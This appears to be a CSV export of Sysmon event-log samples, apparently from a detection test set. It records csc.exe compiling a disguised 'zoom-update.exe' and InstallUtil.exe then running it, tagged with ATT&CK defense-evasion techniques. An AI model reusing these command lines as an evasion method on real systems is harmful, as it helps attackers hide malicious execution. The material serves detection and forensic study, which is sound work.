RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,13275,2021-11-18 07:42:34.4152706,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,RegistryEvent (Object create and delete),NT AUTHORITY\SYSTEM,,"ProcessID: 5672, ProcessGUID: 510c1e8a-0348-6196-6701-000000000f00","RuleName: technique_id=T1543,technique_name=Service Creation",Image: C:\Windows\System32\svchost.exe,EventType: CreateKey,TargetObject: HKLM\System\CurrentControlSet\Services\ClipSVC\Parameters,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1543,technique_name=Service Creation""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:42:34.407""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-0348-6196-6701-000000000f00""},{""@Name"":""ProcessId"",""#text"":""5672""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\System\\CurrentControlSet\\Services\\ClipSVC\\Parameters""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
2,13276,2021-11-18 07:42:34.4167822,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,RegistryEvent (Object create and delete),NT AUTHORITY\SYSTEM,,"ProcessID: 5672, ProcessGUID: 510c1e8a-0348-6196-6701-000000000f00","RuleName: technique_id=T1543,technique_name=Service Creation",Image: C:\Windows\System32\svchost.exe,EventType: CreateKey,TargetObject: HKLM\System\CurrentControlSet\Services\ClipSVC\Parameters,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1543,technique_name=Service Creation""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:42:34.407""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-0348-6196-6701-000000000f00""},{""@Name"":""ProcessId"",""#text"":""5672""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\System\\CurrentControlSet\\Services\\ClipSVC\\Parameters""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
3,13277,2021-11-18 07:42:54.8220979,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,Process creation,CYBERCAT\pc1-user,,"ProcessID: 816, ProcessGUID: 510c1e8a-03fe-6196-7101-000000000f00","RuleName: technique_id=T1218.004,technique_name=InstallUtil","SHA1=25F66231385528D9F0E14546E2132AC486CB6955,MD5=964D5013C1EC42371AD135E02221A704,SHA256=19C86A9315EECCBB480BA6C48711EE24EA24EE97E27C1E1EEAC8B63D01A71D9F,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 6992, ParentProcessGUID: 510c1e8a-ef86-6195-b100-000000000f00","ParentCommandLine: ""C:\Windows\system32\cmd.exe"" ",C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe  /logfile= /LogToConsole=false /U C:\Users\pc1-user\Desktop\zoom-update.exe,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1218.004,technique_name=InstallUtil""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:42:54.817""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-03fe-6196-7101-000000000f00""},{""@Name"":""ProcessId"",""#text"":""816""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe""},{""@Name"":""FileVersion"",""#text"":""4.8.3752.0 built by: NET48REL1""},{""@Name"":""Description"",""#text"":"".NET Framework installation utility""},{""@Name"":""Product"",""#text"":""Microsoft® .NET Framework""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""InstallUtil.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe  /logfile= /LogToConsole=false /U C:\\Users\\pc1-user\\Desktop\\zoom-update.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\pc1-user\\Desktop\\""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""},{""@Name"":""LogonGuid"",""#text"":""510c1e8a-ef28-6195-fe78-060000000000""},{""@Name"":""LogonId"",""#text"":""0x678FE""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=25F66231385528D9F0E14546E2132AC486CB6955,MD5=964D5013C1EC42371AD135E02221A704,SHA256=19C86A9315EECCBB480BA6C48711EE24EA24EE97E27C1E1EEAC8B63D01A71D9F,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744""},{""@Name"":""ParentProcessGuid"",""#text"":""510c1e8a-ef86-6195-b100-000000000f00""},{""@Name"":""ParentProcessId"",""#text"":""6992""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\system32\\cmd.exe\"" ""},{""@Name"":""ParentUser"",""#text"":""CYBERCAT\\pc1-user""}]}}"
4,13278,2021-11-18 07:42:55.7118287,7,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3900,PC-01.cybercat.local,0,S-1-5-18,Image loaded,CYBERCAT\pc1-user,,"ProcessID: 816, ProcessGUID: 510c1e8a-03fe-6196-7101-000000000f00",RuleName: -,"SHA1=CA5480DFE9B4758479D0122246869A2BF1B8C8E5,MD5=B0DCDBAE21904FFBE5F0103D2FAD2E42,SHA256=0DFDE6A504C5AA2FE546D7B5822911A00F83541F8F00936CDCEC3E355F4B3CDF,IMPHASH=DE075F8AD7299810F29C2884CA96DAE1",Signed: true,Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe,,C:\Windows\SysWOW64\urlmon.dll,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:42:55.568""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-03fe-6196-7101-000000000f00""},{""@Name"":""ProcessId"",""#text"":""816""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe""},{""@Name"":""ImageLoaded"",""#text"":""C:\\Windows\\SysWOW64\\urlmon.dll""},{""@Name"":""FileVersion"",""#text"":""11.00.18362.207 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""OLE32 Extensions for Win32""},{""@Name"":""Product"",""#text"":""Internet Explorer""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""UrlMon.dll""},{""@Name"":""Hashes"",""#text"":""SHA1=CA5480DFE9B4758479D0122246869A2BF1B8C8E5,MD5=B0DCDBAE21904FFBE5F0103D2FAD2E42,SHA256=0DFDE6A504C5AA2FE546D7B5822911A00F83541F8F00936CDCEC3E355F4B3CDF,IMPHASH=DE075F8AD7299810F29C2884CA96DAE1""},{""@Name"":""Signed"",""#text"":""true""},{""@Name"":""Signature"",""#text"":""Microsoft Windows""},{""@Name"":""SignatureStatus"",""#text"":""Valid""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
5,13279,2021-11-18 07:43:04.9791963,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 1128, ProcessGUID: 510c1e8a-ef1a-6195-1a00-000000000f00","RuleName: technique_id=T1047,technique_name=File System Permissions Weakness",Image: C:\Windows\System32\svchost.exe,TargetFilename: C:\Windows\Prefetch\INSTALLUTIL.EXE-9953E407.pf,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1047,technique_name=File System Permissions Weakness""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:43:04.966""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef1a-6195-1a00-000000000f00""},{""@Name"":""ProcessId"",""#text"":""1128""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Prefetch\\INSTALLUTIL.EXE-9953E407.pf""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 06:18:57.236""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
6,13280,2021-11-18 07:43:22.4876140,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,CYBERCAT\pc1-user,,"ProcessID: 3116, ProcessGUID: 510c1e8a-ffd9-6195-4401-000000000f00",RuleName: -,Image: C:\Windows\system32\mmc.exe,TargetFilename: C:\Users\pc1-user\Desktop\sysmon.evtx,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:43:22.460""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ffd9-6195-4401-000000000f00""},{""@Name"":""ProcessId"",""#text"":""3116""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\mmc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\Desktop\\sysmon.evtx""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 07:43:22.460""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
7,13281,2021-11-18 07:43:22.7059910,23,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileDelete (A file delete was detected),CYBERCAT\pc1-user,,"ProcessID: 3384, ProcessGUID: 510c1e8a-ef2f-6195-6200-000000000f00",RuleName: -,"SHA1=3F6D19CE07AF1B354560FFCB782D32A60064909D,MD5=306E6CBF14F119BB67860CC98D5AA419,SHA256=E6B3F7EF5EC78452D1AEB9A6D715E371921B31FA8E2175271C74CAC20917B5F3,IMPHASH=00000000000000000000000000000000",TargetFilename: C:\Users\pc1-user\AppData\Roaming\Microsoft\Windows\Recent\sysmon.evtx.lnk,IsExecutable: False,Archived: true,C:\Windows\Explorer.EXE,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:43:22.700""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef2f-6195-6200-000000000f00""},{""@Name"":""ProcessId"",""#text"":""3384""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\sysmon.evtx.lnk""},{""@Name"":""Hashes"",""#text"":""SHA1=3F6D19CE07AF1B354560FFCB782D32A60064909D,MD5=306E6CBF14F119BB67860CC98D5AA419,SHA256=E6B3F7EF5EC78452D1AEB9A6D715E371921B31FA8E2175271C74CAC20917B5F3,IMPHASH=00000000000000000000000000000000""},{""@Name"":""IsExecutable"",""#text"":""False""},{""@Name"":""Archived"",""#text"":""true""}]}}"
1,13252,2021-11-18 07:40:29.5660335,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,Process creation,CYBERCAT\pc1-user,,"ProcessID: 2604, ProcessGUID: 510c1e8a-036d-6196-6801-000000000f00","RuleName: technique_id=T1059,technique_name=Command-Line Interface","SHA1=22A72E39D307BC628093B043EF058DB1310BBF4B,MD5=28D96A80131C05E552066C798C0D8ACB,SHA256=C5270C0D8718C66382240DB538F9BACDED8DB55424768C2D942A6210B96B2720,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 6992, ParentProcessGUID: 510c1e8a-ef86-6195-b100-000000000f00","ParentCommandLine: ""C:\Windows\system32\cmd.exe"" ",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe  /unsafe /nologo /target:exe /out:zoom-update.exe C:\Users\pc1-user\Desktop\zoom-update.cs,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1059,technique_name=Command-Line Interface""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:29.555""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-036d-6196-6801-000000000f00""},{""@Name"":""ProcessId"",""#text"":""2604""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe""},{""@Name"":""FileVersion"",""#text"":""4.8.3752.0 built by: NET48REL1""},{""@Name"":""Description"",""#text"":""Visual C# Command Line Compiler""},{""@Name"":""Product"",""#text"":""Microsoft® .NET Framework""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""csc.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe  /unsafe /nologo /target:exe /out:zoom-update.exe C:\\Users\\pc1-user\\Desktop\\zoom-update.cs""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\pc1-user\\Desktop\\""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""},{""@Name"":""LogonGuid"",""#text"":""510c1e8a-ef28-6195-fe78-060000000000""},{""@Name"":""LogonId"",""#text"":""0x678FE""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=22A72E39D307BC628093B043EF058DB1310BBF4B,MD5=28D96A80131C05E552066C798C0D8ACB,SHA256=C5270C0D8718C66382240DB538F9BACDED8DB55424768C2D942A6210B96B2720,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D""},{""@Name"":""ParentProcessGuid"",""#text"":""510c1e8a-ef86-6195-b100-000000000f00""},{""@Name"":""ParentProcessId"",""#text"":""6992""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\system32\\cmd.exe\"" ""},{""@Name"":""ParentUser"",""#text"":""CYBERCAT\\pc1-user""}]}}"
2,13253,2021-11-18 07:40:29.7742862,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,CYBERCAT\pc1-user,,"ProcessID: 2604, ProcessGUID: 510c1e8a-036d-6196-6801-000000000f00",RuleName: -,Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,TargetFilename: C:\Users\pc1-user\Desktop\CSCFD9BAF75EA53488BBE2F1273837CC796.TMP,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:29.759""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-036d-6196-6801-000000000f00""},{""@Name"":""ProcessId"",""#text"":""2604""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\Desktop\\CSCFD9BAF75EA53488BBE2F1273837CC796.TMP""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 07:40:29.759""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
3,13254,2021-11-18 07:40:29.7954629,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,CYBERCAT\pc1-user,,"ProcessID: 2604, ProcessGUID: 510c1e8a-036d-6196-6801-000000000f00",RuleName: -,Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,TargetFilename: C:\Users\pc1-user\Desktop\zoom-update.exe,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:29.790""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-036d-6196-6801-000000000f00""},{""@Name"":""ProcessId"",""#text"":""2604""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\Desktop\\zoom-update.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 07:40:29.790""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
